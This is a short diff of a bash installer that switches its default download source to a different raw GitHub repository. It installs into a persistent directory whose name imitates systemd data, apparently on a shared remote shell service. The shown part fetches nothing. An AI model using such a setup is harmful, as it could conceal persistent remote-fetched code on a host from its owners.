@@ -1,7 +1,7 @@
 #!/bin/bash
 # Install into /sec (only path that survives Segfault reconnects).
 set -euo pipefail
-BASE="${1:-https://raw.githubusercontent.com/andreamiri354-lab/veron/main}"
+BASE="${1:-https://raw.githubusercontent.com/andreamiri354-lab/veron1/main}"
 DEST="${DEST:-/sec/.local/share/systemd}"
 mkdir -p "$DEST"
 cd "$DEST"
